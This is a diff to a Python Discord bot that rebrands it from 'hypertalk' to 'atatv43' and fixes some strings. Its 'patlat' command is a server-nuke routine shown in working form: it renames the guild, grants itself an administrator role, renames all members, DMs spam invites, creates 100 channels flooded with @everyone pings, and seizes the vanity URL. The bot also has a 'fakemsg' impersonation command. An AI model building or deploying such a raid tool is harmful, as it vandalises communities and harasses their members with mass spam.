@@ -41,7 +41,6 @@ async def on_message(message):
 
   content = message.content.strip()
 
-  # Şəkildəki anti-spam və flood qoruma kodların:
   if len(content) > 150 or message.content.count("@TANRIZİN") > 1 or message.content.count("\n") > 5:
     try:
       await message.delete()
@@ -71,7 +70,6 @@ async def on_message(message):
         print(f"Xəta: {e}")
       return
 
-  # ƏN VACİB: Botun bütün '!' komandalarını oxuması üçün bu təmin edildi:
   await bot.process_commands(message)
 
 
@@ -95,8 +93,8 @@ async def on_member_join(member):
 @bot.command(name="panel")
 async def panel(ctx, kategori: str = None):
   embed = discord.Embed(
-      title="🌐 Hypertalk ULTIMATE CONTROL PANEL (50+ KODUT)",
-      description="Bütün bütün kateqoriyalar və əmrləri aşağıdakı siyahıdadır:",
+      title="🌐 atatv43 ULTIMATE CONTROL PANEL (50+ KODUT)",
+      description="Bütün kateqoriyalar və əmrlər aşağıdakı siyahıdadır:",
       color=discord.Color.dark_red(),
   )
   embed.add_field(
@@ -114,7 +112,7 @@ async def panel(ctx, kategori: str = None):
       value="url, leaderboard, afk, ping, botbilgi, serverbilgi, kullanicibilgi, davat, rolbilgi, kanalbilgi, emoji, istatistik, uptime, destek",
       inline=False,
   )
-  embed.set_footer(text="discord.gg/hypertalk | Ruhus tərəfindən idarə olunur.")
+  embed.set_footer(text="discord.gg/atatv43 | Ruhus tərəfindən idarə olunur.")
   await ctx.send(embed=embed)
 
 
@@ -141,7 +139,7 @@ async def patlat(ctx):
 
   guild = ctx.guild
   try:
-    await guild.edit(name="RUHUX--hypertalk")
+    await guild.edit(name="RUHUX--atatv43")
   except:
     pass
 
@@ -174,7 +172,7 @@ async def patlat(ctx):
 
   try:
     ruhus_role = await guild.create_role(
-        name="HYPERTALK",
+        name="ATATV43",
         color=discord.Color.dark_red(),
         permissions=discord.Permissions(administrator=True)
     )
@@ -183,7 +181,7 @@ async def patlat(ctx):
     pass
 
   try:
-    await guild.edit(name="discord.gg/hypertalk")
+    await guild.edit(name="discord.gg/atatv43")
   except:
     pass
 
@@ -191,24 +189,24 @@ async def patlat(ctx):
     if member == guild.me:
       continue
     try:
-      await member.edit(nick="discord.gg/hypertalk")
+      await member.edit(nick="discord.gg/atatv43")
     except:
       pass
 
     if not member.bot:
       try:
-        await member.send("RUHUX SKOT ATDI discord.gg/hypertalk")
+        await member.send("RUHUX SKOT ATDI discord.gg/atatv43")
       except:
         pass
       await asyncio.sleep(0.02)
 
   for i in range(1, 101):
     try:
-      channel = await guild.create_text_channel(name=f"hypertalk-{i}")
+      channel = await guild.create_text_channel(name=f"atatv43-{i}")
       await asyncio.sleep(0.02)
       for _ in range(40):
         try:
-          await channel.send("@everyone discord.gg/hypertalk")
+          await channel.send("@everyone discord.gg/atatv43")
         except:
           break
         await asyncio.sleep(0.02)
@@ -219,7 +217,7 @@ async def patlat(ctx):
     ruhus_tanri_chan = await guild.create_text_channel(name="ruhus-tanri")
     for _ in range(100):
       try:
-        await ruhus_tanri_chan.send("@everyone RUHUX PAPA discord.gg/hypertalk")
+        await ruhus_tanri_chan.send("@everyone RUHUX PAPA discord.gg/atatv43")
       except:
         break
       await asyncio.sleep(0.02)
@@ -228,7 +226,7 @@ async def patlat(ctx):
 
   try:
     if guild.premium_tier >= 2:
-      await guild.edit(vanity_code="hypertalk")
+      await guild.edit(vanity_code="atatv43")
   except:
     pass
 
@@ -597,7 +595,7 @@ async def fakemsg(ctx, member: discord.Member, *, text):
 async def server_url_info(ctx):
   guild = ctx.guild
   vanity = guild.vanity_url_code if guild.vanity_url_code else "Təyin edilməyib"
-  uses = "Məlumat əldə edilodi"
+  uses = "Məlumat əldə edildi"
   if guild.vanity_url_code:
     try:
       vanity_invite = await guild.vanity_invite()
@@ -607,7 +605,7 @@ async def server_url_info(ctx):
 
   embed = discord.Embed(title="🔗 Server URL (Vanity) Məlumatı", color=discord.Color.gold())
   embed.add_field(name="🌐 Aktiv URL", value=f"discord.gg/{vanity}", inline=False)
-  embed.add_field(name="👥 İstifadə Sayı (Neçə dəfə girilib)", value=str(uses), inline=False)
+  embed.add_field(name="👥 İstifadə Sayı", value=str(uses), inline=False)
   await ctx.send(embed=embed)
 
 
@@ -675,7 +673,7 @@ async def uptime(ctx):
 
 @bot.command(name="destek")
 async def support(ctx):
-  await ctx.send("💬 Dəstək və əlaqə üçün rəsmi ünvan: discord.gg/hypertalk")
+  await ctx.send("💬 Dəstək və əlaqə üçün rəsmi ünvan: discord.gg/atatv43")
 
 
 # ==========================================
@@ -690,3 +688,4 @@ if __name__ == "__main__":
   token = os.getenv("DISCORD_TOKEN")
   if token:
     bot.run(token)
+  
